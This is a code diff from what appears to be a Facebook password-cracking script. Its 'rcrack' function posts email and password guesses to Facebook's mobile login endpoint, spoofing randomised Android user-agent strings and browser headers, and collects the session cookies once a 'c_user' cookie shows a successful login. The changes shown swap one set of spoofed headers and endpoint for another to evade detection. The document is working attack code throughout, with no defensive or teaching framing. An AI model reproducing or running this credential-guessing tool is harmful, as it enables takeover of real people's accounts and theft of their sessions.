@@ -249,7 +249,7 @@ for xd in range(5000):
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -311,13 +311,13 @@ for xd in range(5000):
 
 
 
-    aa='Mozilla/5.0 (Linux; Android'
+    aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
     c=' en-us; Infinix '
     d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
     e=random.randrange(1, 999)
     f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -411,32 +411,22 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'x.facebook.com',
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
-    'dpr': '2.625',
-    'origin': 'https://x.facebook.com',
-    'referer': 'https://x.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"SM-G975U"',
-    'sec-ch-ua-platform': '"macOS"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': pro,
-    'viewport-width': '412',
-    'x-asbd-id': '129477',
-    'x-fb-lsd': 'AVrqBrF5Idc',
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream',}  
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+           # 'cookie': 'datr=EMH4Y6mW-1LbuNiYdvrWyyRF; sb=EMH4Y6ARysPmXgA_p7EKMcII',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Opera";v="92"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"macOS"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+    
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
